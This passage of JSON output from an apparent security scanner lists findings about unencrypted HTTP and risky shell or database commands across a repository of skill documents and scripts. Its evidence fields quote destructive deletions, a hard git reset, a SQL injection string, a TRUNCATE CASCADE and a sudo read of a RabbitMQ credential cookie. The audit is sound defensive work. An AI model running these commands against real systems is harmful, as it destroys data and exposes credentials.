        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1054,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1122,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1128,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1133,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend/v1/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1141,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1149,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1178,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1199,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1222,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://streaming_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1231,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1257,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1262,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_redirect http://backend/ http://$host/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1461,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1500,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1660,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://admin_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1840,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 1930,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2147,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2152,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://auth_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2271,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2345,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2353,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2364,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2369,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2378,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2383,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2416,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2443,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2450,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2470,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://backend:8080/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2535,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2719,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://api_v1/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2779,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://auth_service/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2787,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://user_service/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2795,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://order_service/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/resources/amqp-rabbitmq/scripts/analyze_message_flow.py",
        "line_number": 656,
        "issue": "Unencrypted HTTP",
        "evidence": "management_url = f\"http://{host}:15672\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/resources/amqp-rabbitmq/scripts/validate_rabbitmq_config.py",
        "line_number": 654,
        "issue": "Unencrypted HTTP",
        "evidence": "management_url = f\"http://{host}:15672\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/examples/python/acme_automation.py",
        "line_number": 195,
        "issue": "Unencrypted HTTP",
        "evidence": "print(f\"Make sure this is accessible at: http://{domain}/.well-known/acme-challenge/{challenge.token}\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/examples/timestamp-authority-rfc3161.py",
        "line_number": 26,
        "issue": "Unencrypted HTTP",
        "evidence": "- Sectigo: http://timestamp.sectigo.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/examples/timestamp-authority-rfc3161.py",
        "line_number": 410,
        "issue": "Unencrypted HTTP",
        "evidence": "print(\"  \u2022 Sectigo: http://timestamp.sectigo.com\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/examples/timestamp-authority-rfc3161.py",
        "line_number": 411,
        "issue": "Unencrypted HTTP",
        "evidence": "print(\"  \u2022 GlobalSign: http://timestamp.globalsign.com/tsa/r6advanced1\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/scripts/sign_artifacts.py",
        "line_number": 24,
        "issue": "Unencrypted HTTP",
        "evidence": "sign_artifacts.py --file code.tar.gz --key key.pem --timestamp http://tsa.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/scripts/validate_signatures.py",
        "line_number": 359,
        "issue": "Unencrypted HTTP",
        "evidence": "ns = {'ds': 'http://www.w3.org/2000/09/xmldsig#'}",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 131,
        "issue": "Unencrypted HTTP",
        "evidence": "http_url = self.target.replace('https://', 'http://')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 146,
        "issue": "Unencrypted HTTP",
        "evidence": "hostname = self.target.replace('https://', '').replace('http://', '').split('/')[0]",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/security-headers/resources/scripts/check_headers.py",
        "line_number": 66,
        "issue": "Unencrypted HTTP",
        "evidence": "if not url.startswith(('http://', 'https://')):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 190,
        "issue": "Unencrypted HTTP",
        "evidence": "if stripped.startswith('ADD') and ('http://' in line or 'https://' in line):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 202,
        "issue": "Unencrypted HTTP",
        "evidence": "if 'http://' in line.lower() and 'sha' not in line.lower():",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 318,
        "issue": "Unencrypted HTTP",
        "evidence": "if not ('http://' in line or 'https://' in line or '.tar' in line):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing/resources/scripts/visualize_trace.py",
        "line_number": 537,
        "issue": "Unencrypted HTTP",
        "evidence": "svg_parts.append(f'<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"{width}\" height=\"{height}\">')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/resources/sre-practices/examples/chaos-scenario.py",
        "line_number": 359,
        "issue": "Unencrypted HTTP",
        "evidence": "service_url=\"http://api.example.com\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/resources/sre-practices/examples/chaos-scenario.py",
        "line_number": 360,
        "issue": "Unencrypted HTTP",
        "evidence": "dependency_url=\"http://auth.example.com\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/scripts/validate_alert_rules.py",
        "line_number": 287,
        "issue": "Unencrypted HTTP",
        "evidence": "if url and not url.startswith(('http://', 'https://')):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/frontend/nextjs-seo/resources/scripts/check_seo.py",
        "line_number": 163,
        "issue": "Unencrypted HTTP",
        "evidence": "if not canonical_url.startswith(('http://', 'https://')):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/frontend/nextjs-seo/resources/scripts/generate_sitemap.py",
        "line_number": 203,
        "issue": "Unencrypted HTTP",
        "evidence": "urlset.set('xmlns', 'http://www.sitemaps.org/schemas/sitemap/0.9')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/examples/python/config-generator.py",
        "line_number": 98,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/examples/python/config-generator.py",
        "line_number": 192,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/examples/python/config-generator.py",
        "line_number": 339,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend_pool;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/scripts/validate_config.py",
        "line_number": 343,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_passes = re.findall(r'proxy_pass\\s+http://(\\d+\\.\\d+\\.\\d+\\.\\d+)', content)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 353,
        "issue": "Unencrypted HTTP",
        "evidence": "if kubectl run test-connection --image=curlimages/curl:7.85.0 --rm -i --restart=Never -n \"$NAMESPACE\" -- curl -s --max-time 10 \"http://${first_service}\" &>/dev/null; then",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 109,
        "issue": "Unencrypted HTTP",
        "evidence": "initial_cluster=\"${initial_cluster}etcd-node$i=http://etcd-node$i:2380,\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 125,
        "issue": "Unencrypted HTTP",
        "evidence": "--initial-advertise-peer-urls \"http://etcd-node$i:2380\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 126,
        "issue": "Unencrypted HTTP",
        "evidence": "--listen-peer-urls \"http://0.0.0.0:2380\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 127,
        "issue": "Unencrypted HTTP",
        "evidence": "--listen-client-urls \"http://0.0.0.0:2379\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 128,
        "issue": "Unencrypted HTTP",
        "evidence": "--advertise-client-urls \"http://etcd-node$i:2379\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 335,
        "issue": "Unencrypted HTTP",
        "evidence": "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">",
        "recommendation": "Use HTTPS for external resources"
      }
    ],
    "Dangerous Command": [
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/SECURITY.md",
        "line_number": 61,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /path/to/data  # DESTRUCTIVE - requires confirmation",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/SECURITY.md",
        "line_number": 116,
        "issue": "Destructive file deletion",
        "evidence": "- `rm -rf` without confirmation",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/workflow/project-synthesis/resources/REFERENCE.md",
        "line_number": 193,
        "issue": "Destructive git operation",
        "evidence": "git reset --hard $BASELINE_COMMIT",
        "recommendation": "Warn about data loss and require confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/workflow/project-synthesis/resources/REFERENCE.md",
        "line_number": 307,
        "issue": "Destructive git operation",
        "evidence": "2. **REVERT** - `git reset --hard $BASELINE_COMMIT`  <!-- Intentional recovery step -->",
        "recommendation": "Warn about data loss and require confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cloud/gcp/gcp-storage.md",
        "line_number": 256,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install nfs-common",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cloud/gcp/gcp-storage.md",
        "line_number": 257,
        "issue": "Privilege escalation",
        "evidence": "sudo mkdir -p /mnt/shared",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cloud/gcp/gcp-storage.md",
        "line_number": 258,
        "issue": "Privilege escalation",
        "evidence": "sudo mount 10.0.0.2:/data /mnt/shared  # Use IP from filestore instance",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cloud/gcp/gcp-storage.md",
        "line_number": 261,
        "issue": "Privilege escalation",
        "evidence": "echo \"10.0.0.2:/data /mnt/shared nfs defaults 0 0\" | sudo tee -a /etc/fstab",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/testing/integration-testing/resources/REFERENCE.md",
        "line_number": 1898,
        "issue": "Destructive database operation",
        "evidence": "users = repo.search(\"'; DROP TABLE users; --\")  # Example attack - should be safely handled",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 1649,
        "issue": "Destructive database operation",
        "evidence": "await pool.query('TRUNCATE users, products, orders CASCADE');",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/zig/zig-build-system.md",
        "line_number": 56,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf zig-out zig-cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/mqtt-messaging.md",
        "line_number": 440,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install mosquitto mosquitto-clients",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/protocols/kafka-streams/resources/examples/README.md",
        "line_number": 400,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /tmp/kafka-logs /tmp/zookeeper",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 1546,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get update",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 1547,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install mosquitto mosquitto-clients",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1586,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start rabbitmq-server",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1589,
        "issue": "Privilege escalation",
        "evidence": "sudo cat /var/lib/rabbitmq/.erlang.cookie",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1595,
        "issue": "Privilege escalation",
        "evidence": "echo \"COOKIEVALUE\" | sudo tee /var/lib/rabbitmq/.erlang.cookie",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1596,
        "issue": "Privilege escalation",
        "evidence": "sudo chmod 400 /var/lib/rabbitmq/.erlang.cookie",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1597,
        "issue": "Privilege escalation",
        "evidence": "sudo chown rabbitmq:rabbitmq /var/lib/rabbitmq/.erlang.cookie",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1600,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start rabbitmq-server",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1603,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl stop_app",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1604,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl reset",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1605,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl join_cluster rabbit@ubuntu1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1606,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl start_app",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1612,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl stop_app",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1613,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl reset",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1614,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl join_cluster rabbit@ubuntu1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1615,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl start_app",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1620,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl cluster_status",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 3112,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl status rabbitmq-server",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 3115,
        "issue": "Privilege escalation",
        "evidence": "sudo netstat -tlnp | grep 5672",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 3124,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start rabbitmq-server",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 3127,
        "issue": "Privilege escalation",
        "evidence": "sudo ufw allow 5672/tcp",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 69,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -A 'tcp port 443' | grep -i \"server_name\"",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 163,
        "issue": "Force flag usage",
        "evidence": "--force \\",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
